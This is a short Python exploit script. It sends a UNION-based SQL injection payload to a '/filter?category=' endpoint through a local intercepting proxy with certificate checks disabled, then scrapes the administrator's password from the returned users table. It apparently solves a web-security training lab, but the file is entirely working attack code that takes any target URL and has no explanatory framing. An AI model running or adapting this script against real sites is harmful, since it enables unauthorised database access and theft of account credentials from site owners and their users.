import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_users_table(url):
    username = "administrator"
    path = "/filter?category="
    sql_payload = "' UNION SELECT * FROM users--"
    res = requests.get(url + path + sql_payload, verify=False, proxies=proxies)

    if username in res.text:
        print("[+] Found administrator password.")
        soup = BeautifulSoup(res.text, 'html.parser')
        # in the parsed HTML text, find text "administrator", go to its parent element (which is <tr>)
        # find the next <td> element, which is where the password is stored, and then extract the password at contents[0]
        admin_password = soup.body.find(string=username).parent.findNext('td').contents[0]
        print("[+] The administrator password is: %s" % admin_password)
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('[-] Usage: %s <url>' % sys.argv[0])
        print('[-] Example: %s "www.example.com"' % sys.argv[0])
        exit()
    print("[+] Dumping the list of usernames and passwords...")

    if not exploit_sqli_users_table(url):
        print("[-] Did not find an administrator password.")